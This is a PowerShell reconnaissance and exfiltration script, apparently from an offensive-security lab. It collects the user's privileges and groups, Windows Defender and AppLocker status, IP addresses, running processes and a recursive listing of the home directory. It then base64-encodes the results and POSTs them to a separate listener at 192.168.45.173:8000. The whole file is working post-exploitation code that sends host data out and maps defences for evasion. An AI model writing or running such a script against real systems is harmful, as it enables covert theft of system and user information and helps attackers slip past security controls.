# Gather username, user privileges, and groups
$username = $env:UserName
$userPrivileges = (whoami /priv) -join "`n"
$userGroups = (whoami /groups) -join "`n"

# Check Windows Defender status and definitions
#$defenderStatus = (Get-Service -Name "WinDefend").Status
#$defenderDefs = (Get-MpComputerStatus)

# Check Windows Defender status and definitions using WMI
$defenderInfo = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpComputerStatus" -ErrorAction SilentlyContinue

if ($defenderInfo) {
    $defenderStatus = if ($defenderInfo.AntivirusEnabled) { "Running" } else { "Stopped" }
    $defenderDefs = $defenderInfo.AMProductVersion
} else {
    $defenderStatus = "Windows Defender not found or inaccessible"
    $defenderDefs = "Definitions unavailable"
}

# Get IP addresses and hostname
$ipAddresses = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress -join ", "
$hostname = $env:COMPUTERNAME

# List all running processes
$processList = (Get-Process | Select-Object -Property Name, Id) | ForEach-Object {
    @{
        ProcessName = $_.Name
        ProcessId = $_.Id
    }
}

# Get AppLocker policies as OuterXml to avoid newlines and special characters issues
# Get AppLocker policies, check if AppLocker is configured
$applockerPoliciesXml = try {
    $appLockerPolicy = (Get-AppLockerPolicy -Effective -Xml)
    if ($appLockerPolicy) {
        $appLockerPolicy
    } else {
        "No AppLocker policy configured"
    }
} catch {
    "AppLocker policy retrieval failed or not configured"
}


# List contents of home directory
$homeDirectory = Get-ChildItem -Path "$env:USERPROFILE" -Recurse | Select-Object -Property FullName, Length, LastWriteTime

# Prepare all gathered data
$data = @{
    Username       = $username
    UserPrivileges = $userPrivileges
    UserGroups     = $userGroups
    DefenderStatus = $defenderStatus
    DefenderDefs   = $defenderDefs
    IPAddress      = $ipAddresses
    Hostname       = $hostname
    Processes      = $processList
    HomeDirectory  = $homeDirectory
    AppLockerPolicies = $applockerPoliciesXml
}

# Convert data to JSON, then encode as UTF-8 and base64
$jsonData = $data | ConvertTo-Json -Compress
$utf8Data = [System.Text.Encoding]::UTF8.GetBytes($jsonData)
$base64Data = [Convert]::ToBase64String($utf8Data)

# Send the POST request with the encoded data
Invoke-RestMethod -Uri "http://192.168.45.173:8000/?data=$base64Data" -Method POST

